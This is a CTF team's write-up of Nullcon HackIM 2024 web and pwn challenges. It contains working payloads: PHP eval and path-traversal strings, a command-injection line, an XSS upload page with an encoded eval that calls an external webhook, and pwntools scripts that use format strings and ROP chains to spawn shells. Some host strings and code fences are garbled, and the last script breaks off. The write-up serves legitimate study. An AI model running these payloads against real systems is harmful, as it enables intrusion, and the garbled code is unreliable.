---
title: Nullcon HackIM CTF 2024, Berlin
date: '2024-03-22'
draft: false
tags: ['Web', 'Pwn', 'Misc', 'Crypto', 'nullcon-hackim-ctf-2024']
summary: nullcon HackIM CTF 2024, Berlin Writeup.
---

# Nullcon HackIM CTF 2024, Berlin

![chall-sc](https://hackmd.io/_uploads/HyDSeGP0T.png)

On 14th and 15th March 2024, `SNI` participated in the `Nullcon HackIM CTF 2024`. We are very grateful to announce that we achieved the `3rd rank` on the leaderboard. Additionally, we secured the `2nd rank` specifically in the `Online Category` leaderboard. These are our writeups for the challenges that we solved during the CTF.

# Sanity

## sanity proof

> Read the rules and find flag

This is a Bonus Challenge

![images](https://hackmd.io/_uploads/ryT5ZhL06.png)

Flag: `ENO{th1s_is_4n_eXample}`

# Web

## faleval

> My friend makes ymmuy faleval, but sometimes he mixes up thingsm but what can you do? \
> **Author:** @gehaxelt \
> **Conn:** 52.59.124.14:5000

```php
<?php
ini_set("error_reporting", 0);
ini_set("short_open_tag", "Off");

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$input = $_GET['input'];

if(preg_match('/[^\x21-\x7e]/', $input)) {
    die("Illegal characters detected!");
}

$filter = array("<?php", "<? ", "?>", "echo", "var_dump", "var_export", "print_r", "Flag");
$filter = array("<?php", "<? ", "?>","*", "/", "var_dump", "var_export", "print_r", "Flag");
foreach($filter as &$keyword) {
    if(str_contains($input, $keyword)) {
        die("PHP code detected!\n");
    }
}

eval("?>" . $input);

echo "\n";

?>

<html>
    <head>
        <title>Faleval</title>
    </head>
    <body>
        <h1>Faleval</h1>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>

Faleval

To view the source code, click here.
```

### Solution

**Payload:** `?input=<?=file_get_contents('flag.php');`

Flag: `ENO{YummY_YummY_Falafel_Expl01tz}`

## Bassy

> Do you like bass(e)? We only know that the admin's encoded password begins with 'OP)s'... \
> **Author:** @gehaxelt \
> **Conn:** 52.59.124.14:5008

Theory: https://stackoverflow.com/questions/12598407/why-does-php-convert-a-string-with-the-letter-e-into-a-number

> Other answers have already mentioned this, but the PHP manual has explicitly stated it now. PHP interprets any string containing an 'E' bounded by numbers as scientific notation (EXPONENT_DNUM: (\{LNUM} \{DNUM}) [eE][+-]?\{LNUM}). As you can see, this interpretation is case-insensitive (E or e). Where this becomes a `gotcha` in weak type string comparisons var_dump("2E1" == "020"); // true 2E1 is really 2 \* (10 ^ 1), and that works out to 20. Insert any other letter there and it will return the expected false. From the question "608E-4234" == "272E-3063" That works out to 608 \_ (10 ^ -4234) == 272 \* (10 ^ -3063) Neither number can be represented by PHP (as JvdBerg noted), so they are converted to 0

### ![images](https://hackmd.io/_uploads/SJ83Ci8R6.png)

Based on the given source code, we are asked to input a password for the admin account. The parameters are as follows:

1. The input that we need to pass will be encoded with Base85.
2. The encoded result will be compared (non-strictly) with the Base85 decoded result of the ADMIN_PW variable.
3. We know that some of the first part of the encoded ADMIN_PW is '0P)s', which corresponds to the value '0e1'.
4. Based on that, we need to find a string that, when encoded with Base85, will have the same value as '0e1' (or '0')."

Lets try with: 1+ª. Input to Burpsuite Repeater:

### ![images](https://hackmd.io/_uploads/BkOZAsUCT.png)

Flag: `ENO{B4sE_85_L0l_0KaY_1337}`

## Trafficking

> The internet is full of traffic and people implement their own traffcki ng tools.„ so what could 80 wrong? \
> **Author:** @gehaxelt \
> **Conn:** 52.59.124.14:5006

```python
import logging
import sys
import slimHTTP


http = slimHTTP.host(slimHTTP.HTTP, port=8080,web_root='./', index='index.html')
@http.configuration
def config(instance):
    return {
        'web_root' : './',
        'index' : 'index.html',
        'vhosts' : {
            'smuggly' : {
                'proxy' : 'smuggly:8080',
            }
        }
    }


@http.route('/admin', vhost='smuggly')
def admin(request):
    return slimHTTP.HTTP_RESPONSE(ret_code=400, payload=b'Forbidden')




while 1:
    for event, *event_data in http.poll():
        pass
```

The code requires us to create a custom header capable of passing the given parameters. We'll utilize Burp Suite to generate this custom header. The access must be made with the vhost 'smuggly', the host as localhost, and directed to the endpoint '/admin'

![images](https://hackmd.io/_uploads/rJkC0ObCp.png)

Flag: `ENO{OH_TH4T_W4S_T00_EAZZ1}`

## The Fast Falafel Shop

> Because @gehaxelt loves Falafel so much, I built a website for him ;) Hurry up though, the contest is not gonna last forever. \
> **Author:** @moaath \
> **Connection: 52**.59.124.14:5010\*\* > **Attachment:** source.zip

```php
<?php
$files = $_FILES["fileToUpload"];
  $target_dir = "uploads/" . $files["name"];
if ($files["name"] != "") {
  $target_dir = "uploads/" . $files["name"];
  if(strpos($target_dir,"..") !== false){
      echo "Sorry, there was an error while uploading! <br>";
      http_response_code(403);
    }
    move_uploaded_file($files["tmp_name"], $target_dir);
  if (checkViruses($target_dir) && checkFileType($target_dir)) {
      echo "<a href='$target_dir'>uploaded images!</a>";
  } else {
      unlink($target_dir);
      echo "Sorry, there was an error while uploading! <br>";
      http_response_code(403);
  }
}

function checkViruses($fileName)
{
  $hash = password_hash($fileName, PASSWORD_BCRYPT, ["cost" => 12]);
  return !password_verify("uploads/exploit.php", $hash);
}

function checkFileType($fileName)
{
  $extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
  if ($extension != "jpg" && $extension != "png") {
      echo "Sorry, only JPG & PNG files are allowed <br>";
      return false;
  } else {
      return true;
  }
}
?>
```

The file will first be moved to the public folder and then removed if the condition is not met. There is a race condition where the checkViruses function, which is computationally expensive, can be accessed before the file is deleted.

Flag: `ENO{D0N'T_ST0R3_F1L3S_B3F0R3_VAL1DAT1NG_TH3M}`

## The Fast Falafel Shop 2

> It looks like our page had a bug :( We did fix it tho! And we even added a little treat for you guys! (But dont tell @gehaxelt about our secret) \
> **Author:** @moaath,@layton \
> **Connection: 52**.59.124.14:5012\*\* > **Attachment:** docker-compose.yml, shop.zip

````php

Objective: Obtain the flag in a cookie with the domain `shop`.

```python
    url = sys.argv[1]

    if not re.match(r"^https?:\/\/", url):
        return

    browser = await launch(options={
        "headless": True,
        "executablePath": "/usr/bin/chromium",
        "ignoreHTTPSErrors": True,
        "args": ["--no-sandbox"]
    })
    page = await browser.newPage()

    await page.setCookie({"name": "flag", "value": Flag, "domain":"shop"})
    await page.goto(url, {"timeout": 0})
    await asyncio.sleep(3)
    await browser.close()
    print(url)
````

The Docker hostname will be `shop`, so `http://shop` refers to localhost, and `secret.php` is the bot.

```php

<?php
if (isset($_POST["url"])) {
  exec("python3 /opt/admin.py " . escapeshellarg($_POST["url"]) . " > /dev/null &");
  echo "Visiting url...";
  die();
}
?>
```

There was XSS in contest.php

```php
echo "<a href='$target_dir'>uploaded images!</a>";
```

If the filename is `'><script>alert(1)</script>x.png` the output should be

```html
<a href=""
  ><script>
    alert(1)
  </script>
  .png>uploaded images!</a
>
```

Then the alert will be trigerred since there was no csrf protection and we can tell the bot to visit any url, we can tell the bot to visit our malicious site with the exploit

```html
<form action="http://shop/contest.php" method="POST" enctype="multipart/form-data">
  <input type="file" name="fileToUpload" id="fileToUpload" />
</form>
<script>
  const file = new File(
    ['foo'],
    "foo'><svg onload=eval(atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvZGE0NWViMTctYzIzZC00NmViLWE2N2ItZGE3MTY4ZWE1MDhi=='))>.jpg",
    {
      type: 'images/jpeg',
    }
  )

  const dataTransfer = new DataTransfer()
  dataTransfer.items.add(file)

  const form = document.forms[0]
  form.children[0].files = dataTransfer.files

  form.submit()
</script>
```

## traversaller

> Do you have fun travelling through different filesystems? \
> **Author:** @gehaxelt \
> **Conn:** 52.59.124.14:5017

```php
<?php
ini_set("error_reporting", 0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "/var/www/html/flag.php";

function sanitize_path($p) {
        return str_replace(array("\0","\r","\n","\t","\x0B",'..','./','.\\','//','\\\\',),'',trim($p, "\x00..\x1F"));
}
$path = $_GET['path'];
if(isset($path) && str_contains($path, "/var/www/html/static/")) {
    die(file_get_contents(sanitize_path($path)));
}

?>

<html>
    <head>
        <title>Traversaller</title>
    </head>
    <body>
        <h1>Traversaller</h1>
        <p>To view the source code, <a href="/?source">click here.</a>
        <script src="/?path=/var/www/html/static/flag.js"></script>
    </body>
</html>
```

### SOLUTION

```php
php:/\\\\/filter/read=/var/www/html/static/resource=/var/www/html/flag.php
```

Flag: `ENO{PhP_P4tH-Tr4vers4L_FuN!}`

## executy

> Some things are just so cutey sometimes :) \
> **Author:** @gehaxelt \
> **Conn:** 52.59.124.14:5005

We were given a website where we can execute a bash command on the following input box

### ![images](https://hackmd.io/_uploads/SkC2Fk806.png)

We can also see the source code of the website and it uses php. Long story short, our bash command input will be checked whether it matches what is in the `$THE_SCRIPT` variable or not. If it is different, then the command we give will not be executed.

![images](https://hackmd.io/_uploads/H11apkIRT.png)

We discovered something interesting, the bash command we input is not directly compared to the `$THE_SCRIPT` variable. Instead, it's captured using a hardcopy screen. Subsequently, the web application uses the trim function to extract the text that will be compared with `$THE_SCRIPT`. We can exploit this behavior to launch a CLRF (Carriage Return Line Feed) attack.

![images](https://hackmd.io/_uploads/H1y3xxU0a.png)

#### POC

With the following payload, we can create a trim function that ignores arbitrary bash commands that we pass, which is "_cat _ #\*"

```
%23%21%2Fbin%2Fsh%0Acat%20*%20#%0Dcat+flag.txt%3B
```

![images](https://hackmd.io/_uploads/HJjpzgI06.png)

Flag: `ENO{BEWARE_OF_TERM1N4L_3SCAPE_SEQUENCES!}`

# Pwn

## baby_formatter

> Since I hate format exploits challenges I decided to not only do one but three hehe. This is challenge one of the series. \
> **Author:** @moaath \
> **Connection: 52**.59.124.14:5030\*\* > **Attachment:** baby_formatter

In this challenge, we were given a binary named `baby_formatter`. First, let's see what mitigations the binary file has.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Then let's dive into the disassembly of the binary.

#### main

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v4; // [rsp+78h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  puts("give me your input and I will give it back to you :)");
  read(0, buf, 0x64uLL);
  printf(buf);
  puts("bye!");
  exit(1);
}
```

The `main` function takes our input with read(0, buf, 0x64uLL) and then prints our input again with printf without a format string specifier.

#### win

```c
int win()
{
  puts("huh? how did you find me???");
  printf("oh well here is your shell");
  return execve("/bin/sh", 0LL, 0LL);
}
```

The `win` function uses execve("/bin/sh", 0LL, 0LL) to achieve arbitrary code execution. Additionally, since the binary is Partial Relro, the Global Offset Table (GOT) is writable. Therefore, we can overwrite the GOT entry of the exit function to point to the win function, allowing us to achieve arbitrary code execution.

#### POC

```python
#!/usr/bin/python
from pwn import *
exe = './baby_formatter'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc Connection: 52.59.124.14 503**0".split(" ")[1:
io = remote(host, port)
p = '%{}c.'.format(elf.sym.win).encode()
p += b'%11$ln'
p = p.ljust(24, b'\0')
p += p64(elf.got.exit)
io.sendline(p)
io.interactive()
```

![images](https://hackmd.io/_uploads/SJ-0nD406.png)

Flag: `ENO{W3LL_THAT_WA5_AN_3A5Y_0N3_1_GU355}`

## junior_formatter

> Since I hate format exploits challenges I decided to not only do one but three hehe. This is challenge two of the series. \
> **Author:** @moaath \
> **Connection: 52**.59.124.14:5031\*\* > **Attachment:** junior_formatter, Dockerfile

In this challenge, we were given a binary named `junior_formatter` and a Dockerfile that states the binary is built using Ubuntu 22:04. From this information, we can conclude that the glibc version is glibc version 2.35. Now, let's analyze the mitigations present in the binary file.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Then let's dive into the disassembly of the binary.

#### main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+7h] [rbp-89h] BYREF
  int v5; // [rsp+8h] [rbp-88h]
  int v6; // [rsp+Ch] [rbp-84h]
  int v7; // [rsp+10h] [rbp-80h]
  char s[10]; // [rsp+16h] [rbp-7Ah] BYREF
  char buf[104]; // [rsp+20h] [rbp-70h] BYREF
  unsigned __int64 v10; // [rsp+88h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  logo();
  puts("Welcome to our comment section!");
  puts("here you can leave us a comment about our website and the things we can improve!");
  printf(">> ");
  v5 = read(0, buf, 0x64uLL);
  puts("your input:");
  printf(buf);
  puts("are you sure you want to submit it (s) or you want to rewrite it (r)?");
  __isoc99_scanf("%c%*c", &v4);
  if ( v4 == 114 )
  {
    puts("Alright, you will get one more try to correct your spelling ;)");
    printf(">> ");
    v6 = read(0, buf, 0x64uLL);
    puts("your input:");
    printf(buf);
  }
  puts("lastly give us your Name");
  printf(">> ");
  v5 = read(0, s, 0xAuLL);
  v7 = strlen(s);
  if ( v7 > 10 )
  {
    puts("name is too long!");
    exit(1);
  }
  puts("Thank you for the Feedback!");
  return 0;
}
```

In the provided `main` function, there are two instances of potential format string vulnerabilities due to the use of `printf(buf)` without a format specifier.

#### logo

```c
int logo()
{
  puts(" __  ____   __   ____ ___   ___  _          ");
  puts("|  \\/  \\ \\ / /  / ___/ _ \\ / _ \\| |         ");
  puts("| |\\/| |\\ V /  | |  | | | | | | | |         ");
  puts("| |  | | | |   | |__| |_| | |_| | |___      ");
  puts("|_|  |_| |_|____\\____\\___/_\\___/|_____|____ ");
  puts("\\ \\      / / ____| __ ) ___|_ _|_   _| ____|");
  puts(" \\ \\ /\\ / /|  _| |  _ \\___ \\| |  | | |  _|  ");
  puts("  \\ V  V / | |___| |_) |__) | |  | | | |___ ");
  return puts("   \\_/\\_/  |_____|____/____/___| |_| |_____|\n");
}
```

The `logo` function prints out the banner. Since the binary has Position Independent Executable (PIE) enabled and Partial Relro, we can overwrite the Global Offset Entry.

Firstly, we must obtain the Executable and Linkable Format (ELF) base address to calculate the offset of the Global Offset Table (GOT), and the libc's base address to calculate the fixed offset of execve("/bin/sh", r10, rdx).

In this case, I overwrote the Global Offset Table entry of puts to execve("/bin/sh", r10, rdx) to achieve arbitrary code execution.

#### POC

```python
#!/usr/bin/python
from pwn import *
exe = './junior_formatter'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc Connection: 52.59.124.14 503**1".split(" ")[1:
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()
libc = ELF('./libc6_2.35-0ubuntu3.6_amd64.so', checksec = 0)

p = b'%25$p %27$p'
sla(b'>> ', p)
rl()
leaked = rud(b'\n').split(b' ')
libc.address = int16(leaked[0]) - 0x276ca - 0x26c6
li(hex(libc.address))
elf.address = int16(leaked[1]) - 0x000012bb
li(hex(elf.address))
sla(b'(r)?\n', b'r')
p = fmtstr_payload(10, {elf.got.puts: (libc.address + 0xebc85)}, write_size='short') # execve("/bin/sh", r10, rdx)
assert len(p) < 0x64
sla(b'>> ', p)
com()
```

![images](https://hackmd.io/_uploads/Sk1OXXr06.png)

Flag: `ENO{N1C3_Y0U_G0T_TH15_0N3_T00_G00D_J0B!}`

## Hangman

> We love C and we love games. So we decided to implement a simple game to test our C knowledge! Go and have a look at the coolest Hangman game ever made! \
> **Authors:** @anajana, @moaath
> **Connection: 52**.59.124.14:5029\*\* > **Attachment:** hangman, Dockerfile

In this challenge, we were given a binary named `hangman` along with a `Dockerfile`. First, let's see what mitigations the binary file has.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Then let's dive into the disassembly of the binary.

#### main

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  __int64 RandomWord; // [rsp+8h] [rbp-8h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  RandomWord = getRandomWord();
  puts("Welcome to hangman!");
  puts("===================");
  while ( 1 )
  {
    puts("What would you like to do?");
    puts("1) Play\n2) Choose another word (newbies)\n3) Quit");
    printf(">> ");
    __isoc99_scanf("%i%*c", &v3);
    if ( v3 == 3 )
      break;
    if ( v3 <= 3 )
    {
      if ( v3 == 1 )
      {
        playGame(RandomWord);
      }
      else if ( v3 == 2 )
      {
        RandomWord = getRandomWord();
        puts("Word updated successfully!");
      }
    }
  }
  puts("Bye!");
  exit(1);
}
```

The `main` function firstly generates a random string using the function called `getRandomWord` and then we were given 3 options: play the game, generate another random word, or quit the program.

Let's see what the `getRandomWord` function does.

#### getRandomWord

```c
char *getRandomWord()
{
  unsigned int v0; // eax

  v0 = time(0LL);
  srand(v0);
  return &words[18 * (rand() % 17)];
}

.data:00000000004040A0 words           db 'Anthropomorphist',0 ; DATA XREF: getRandomWord+5F↑o
.data:00000000004040B1                 align 2
.data:00000000004040B2 aDecentralizati db 'Decentralization',0
.data:00000000004040C3                 align 4
.data:00000000004040C4 aAntidisestabli db 'Antidisestablish',0
.data:00000000004040D5                 align 2
.data:00000000004040D6 aOtherworldline db 'Otherworldliness',0
.data:00000000004040E7                 align 8
.data:00000000004040E8 aUncharacterist db 'Uncharacteristic',0
.data:00000000004040F9                 align 2
.data:00000000004040FA aUltraliberalis db 'Ultraliberalisms',0
.data:000000000040410B                 align 4
.data:000000000040410C aMisunderstandi db 'Misunderstanding',0
.data:000000000040411D                 align 2
.data:000000000040411E aUnpredictabili db 'Unpredictability',0
.data:000000000040412F                 align 10h
.data:0000000000404130 aTechnicalizati db 'Technicalization',0
.data:0000000000404141                 align 2
.data:0000000000404142 aRecapitalizati db 'Recapitalization',0
.data:0000000000404153                 align 4
.data:0000000000404154 aBiotechnologis db 'Biotechnologists',0
.data:0000000000404165                 align 2
.data:0000000000404166 aCalligraphical db 'Calligraphically',0
.data:0000000000404177                 align 8
.data:0000000000404178 aEffortlessness db 'Effortlessnesses',0
.data:0000000000404189                 align 2
.data:000000000040418A aIntercontinent db 'Intercontinental',0
.data:000000000040419B                 align 4
.data:000000000040419C aFashionabiliti db 'Fashionabilities',0
.data:00000000004041AD                 align 2
.data:00000000004041AE aUnpredictabili_0 db 'Unpredictabilitiesirresponsibilities',0
```

The function generates a random string from an array of strings named `words`, but before that, the pseudo-random generator seeded by the `time(0)`, leadings to a predictable result. Another thing worth noting is the difference in string length of the last word in the array that seems like a minor mistake, but actually that could potentially be a route to a buffer overflow bug since there is no stack canary.

#### playGame

```c
int __fastcall playGame(const char *a1)
{
  int result; // eax
  char v2[23]; // [rsp+10h] [rbp-20h] BYREF
  char v3; // [rsp+27h] [rbp-9h] BYREF
  int v4; // [rsp+28h] [rbp-8h] BYREF
  unsigned int v5; // [rsp+2Ch] [rbp-4h]

  v5 = strlen(a1);
  printGameMenu(v5);
  while ( attempts <= 6 )
  {
    puts("Choose an action: \n1) Guess letter\n2) Guess word\n3) Give up");
    printf(">> ");
    __isoc99_scanf("%i%*c", &v4);
    result = v4;
    if ( v4 == 3 )
    {
      attempts = 0;
      return result;
    }
    if ( v4 <= 3 )
    {
      if ( v4 == 1 )
      {
        printf("Enter letter: ");
        __isoc99_scanf(" %c", &v3);
        checkLetter(a1, (unsigned int)v3);
      }
      else if ( v4 == 2 )
      {
        printf("Enter word: ");
        fgets(v2, 2 * v5, stdin);
        checkWord(a1, v2);
      }
    }
  }
  result = puts("You ran out ot attempts :<");
  attempts = 0;
  return result;
}

int __fastcall checkLetter(const char *a1, char a2)
{
  int i; // [rsp+1Ch] [rbp-14h]

  if ( strchr(a1, a2) )
  {
    for ( i = 0; i < strlen(a1); ++i )
    {
      if ( a2 == a1[i] )
        currentGuess[i] = a2;
    }
    return puts(currentGuess);
  }
  else
  {
    puts("You guessed wrong!");
    puts((&hangmen)[attempts]);
    puts(currentGuess);
    return ++attempts;
  }
}

__int64 __fastcall checkWord(const char *a1, const char *a2)
{
  size_t v2; // rax

  v2 = strlen(a1);
  if ( !strncmp(a1, a2, v2) )
  {
    puts("Congrats! You guessed the word, enjoy the win, hangman master ;)");
    exit(1);
  }
  puts("You guessed wrong!");
  puts((&hangmen)[attempts]);
  puts(currentGuess);
  return (unsigned int)++attempts;
}
```

We were given 7 attempts to guess the random word that generated previously. We have 3 options: guess a letter, directly guess the word, or give up and back to the main menu. Notice that in the guess word section, the program asks us for `2 * v5` bytes of input where `v5` is the length of the random word. That can lead to buffer overflow bug if `2 * v5` is greater than the size of the input buffer `v2`, i.e. 23 bytes. Since almost all words has 18 bytes, the condition easily satisfied, but the overflow size is so small we can't do anything useful. Fortunately, there is one word that has larger length, i.e. the last word that i mentioned before. It has 36 bytes length that makes us have `2 * 36 - 23 = 49 bytes` overflow. That's enough bytes to place 3 ROP gadgets for our exploit.

Let's see what useful gadgets we have from the binary.

```
...
0x00000000004012be : pop rdi ; ret
...
```

Cool! We have `pop rdi` gadget to set the first argument of a function call. It can be used to call `puts(puts)` to leak libc address. After we get the libc address, we can simply call `system("/bin/sh")` and get a shell.

But there is a problem: the word is randomly choosen from the array. In this case, it is actually not a problem since we knew the seed of the pseudo-random generator that makes the random word became predictable. So, we just have to continously generate random word until we get the word we want.

#### POC

```python
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

context.terminal = "kitty @launch --location=split --cwd=current".split()


def start():
    if args.LOCAL:
        if args.GDB:
            return gdb.debug(
                exe.path,
                gdbscript="""
            # b playGame
            c
            """,
            )
        return process(exe.path)
    return remote(args.HOST or host, args.PORT or port)


host, port = "Connection: 52**.59.124.14", 50
exe = context.binary = ELF("./hangman_patched")
libc = ELF("./libc.so.6", False)
cdll = CDLL("libc.so.6")

io = start()


def get_index():
    cdll.srand(cdll.time(0))
    return cdll.rand() % 17


prog = log.progress("Doing black magic")
idx = get_index()
while idx != 15:
    sleep(1)
    io.sendlineafter(b">> ", b"2")
    idx = get_index()
    prog.status(idx)
prog.success()

io.sendlineafter(b">> ", b"1")

rop = ROP(exe)
rop.raw(b"A" * 40)
rop.puts(exe.got["puts"])
rop.main()

io.sendlineafter(b">> ", b"2")
io.sendlineafter(b": ", rop.chain()[:-1])
sleep(0.3)
io.sendlineafter(b">> ", b"3")

libc.address = u64(io.recv(6) + b"\0\0") - libc.sym["puts"]
log.info(f"{hex(libc.address) = }")

rop = ROP(libc)
rop.raw(b"A" * 40)
rop.call(rop.ret.address)
rop.system(next(libc.search(b"/bin/sh\0")))

io.sendlineafter(b">> ", b"1")
io.sendlineafter(b">> ", b"2")
io.sendlineafter(b": ", rop.chain()[:-1])
sleep(0.3)
io.sendlineafter(b">> ", b"3")

io.interactive()
```

### ![images](https://hackmd.io/_uploads/BJTu-QMAT.png)

Flag: `ENO{HANG_0N_T3HR3_B0DY_1T5_0NLY_0FF_BY_0N3_3RR0R_W1TH_S0M3_LUCK!}`

## SENIOR_formatter

> Since I hate format exploits challenges I decided to not only do one but three hehe. This is challenge three of the series. \
> **Author:** @moaath \
> **Connection: 52**.59.124.14:5032\*\* > **Attachment:** senior_formatter, Dockerfile

In this challenge, we were given a binary named `senior_formatter` and a Dockerfile that states the binary is built using Ubuntu 22:04. From this information, we can conclude that the glibc version is glibc version 2.35. Now, let's analyze the mitigations present in the binary file.

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Then let's dive into the disassembly of the binary.

#### main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  logo();
  puts("Can you defeat the final boss?");
  puts("I even heard that he uses full relocations and is imposible to find!");
  puts("All we can offer you is this: (you can use them as many times as u like)\n");
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d%*c", &v4);
    if ( v4 == 3 )
      break;
    if ( v4 > 3 )
      goto LABEL_10;
    if ( v4 == 1 )
    {
      putchar(10);
      puts("someone ran the forbidden command and extracted some valuable information");
      puts("the person left a note the says the following:");
      puts("the binary runs with FULL RELRO, therefore we can't overwrite GOT");
      puts("BUT, I have a solution!, we can ... HAHAHAHAH YOU THINK I WILL LET YOU FIND ME!!!");
      puts("Damn it, the boss must of found the note before us and ripped the last part out");
      puts("well then looks like you are on your own, good luck!");
      putchar(10);
    }
    else if ( v4 == 2 )
    {
      locate_the_boss();
    }
    else
    {
LABEL_10:
      puts("invalid input :(");
    }
  }
  puts("\nOh well you tried at least");
  puts("Bye");
  return 0;
}
```

#### menu

```c
int menu()
{
  puts("1. get help");
  puts("2. try to locate the boss");
  puts("3. give up and accept defeat");
  return printf(">> ");
}
```

The `main` function calls the `menu` function which presents three options:`get help` for option one, `try to locate the boss` for option two, and `give up and accept defeat` for option three.

#### logo

```c
int logo()
{
  puts(" _____ _   _ _____   _____ ___ _   _    _    _       ____   ___  ____ ____  ");
  puts("|_   _| | | | ____| |  ___|_ _| \\ | |  / \\  | |     | __ ) / _ \\/ ___/ ___| ");
  puts("  | | | |_| |  _|   | |_   | ||  \\| | / _ \\ | |     |  _ \\| | | \\___ \\___ \\ ");
  puts("  | | |  _  | |___  |  _|  | || |\\  |/ ___ \\| |___  | |_) | |_| |___) |__) |");
  puts("  |_| |_| |_|_____| |_|   |___|_| \\_/_/   \\_\\_____| |____/ \\___/|____/____/ ");
  return putchar(10);
}
```

The `logo` function prints out the banner.

#### locate_the_boss

```c
unsigned __int64 locate_the_boss()
{
  char s[56]; // [rsp+10h] [rbp-40h] BYREF
  unsigned __int64 v2; // [rsp+48h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  memset(s, 0, 0x32uLL);
  puts("\nwether it's your first or nth time good luck!");
  puts("Enter your input:");
  printf(">> ");
  read(0, s, 0x32uLL);
  alert_bad_characters(s);
  puts("\nHere is your input:");
  printf(s);
  putchar(10);
  return v2 - __readfsqword(0x28u);
}
```

The `locate_the_boss` function takes our input with read(0, buf, 0x32uLL) and then prints our input again with printf without a format string specifier.

#### alert_bad_characters

```c
char *__fastcall alert_bad_characters(const char *a1)
{
  char *result; // rax

  if ( strchr(a1, 'p') || (result = strchr(a1, 'x')) != 0LL )
  {
    puts("you shall not pass!");
    exit(1);
  }
  return result;
}
```

The `alert_bad_characters` function checks the input string and does not allow it to contain the characters 'x' or 'p'. If either of these characters is found in the input, the function prints 'you shall not pass!' and exits the program.

Since the binary has Position Independent Executable (PIE) enabled and Full Relro, we cannot overwrite the Global Offset Entry. However, we can overwrite the return address.

Firstly, we must obtain the libc's base address and the return address. Once we have obtained these addresses, we can build a ROP chain on the return address by using format string write to achieve arbitrary code execution.

#### POC

```python
#!/usr/bin/python
from pwn import *
exe = './senior_formatter'
elf = context.binary = ELF(exe, checksec = 0)
context.bits = 64
context.log_level = 'debug'
context.terminal = ["kitty", "@launch", "--location=split", "--cwd=current"]
host, port = "nc Connection: 52.59.124.14 503**2".split(" ")[1:
io = remote(host, port)
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
ru = lambda a: io.recvuntil(a)
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
rl = lambda: io.recvline()
com = lambda: io.interactive()
li = lambda a: log.info(a)
rud = lambda a:io.recvuntil(a, drop=0x1)
r = lambda: io.recv()
int16 = lambda a: int(a, 16)
rar = lambda a: io.recv(a)
rj = lambda a, b, c : a.rjust(b, c)
lj = lambda a, b, c : a.ljust(b, c)
d = lambda a: a.decode('utf-8')
e = lambda a: a.encode()
cl = lambda: io.close()
libc = ELF('./libc6_2.35-0ubuntu3.6_amd64.so', checksec = 0)

def locate_boss(p: bytes):
	sla(b'>> ', b'2')
	sla(b'>> ', p)
	rud(b'input:\n')

def overwrite(address, value):
    i = 0
    while value & 0xFFFF:
        locate_boss(
            fmtstr_payload(
                8,
                {address + 2 * i: value & 0xFFFF},
                write_size="short",
            )
        )
        value >>= 16
        i += 1

# locate_boss(b'%21$lu')
locate_boss(b'%21$llX %16$llX')
leaked = rud(b'\n').split(b' ')
libc.address = int16(leaked[0]) - 0x29d90
assert libc.address & 0xfff == 0
li(f"Libc Address: {hex(libc.address)}")
savedrbp = int16(leaked[1])
li(f"Saved RBP: {hex(savedrbp)}")
retaddr = savedrbp + 0x8
rop = ROP(libc)
rop.call(rop.ret.address)
rop.system(next(libc.search(b"/bin/sh\0")))
li(f"Return Address: {hex(retaddr)}")
li(f"{rop.dump()}")
for i, chunk in enumerate(
    [rop.chain()[i : i + 8] for i in range(0, len(rop.chain()), 8)]
):
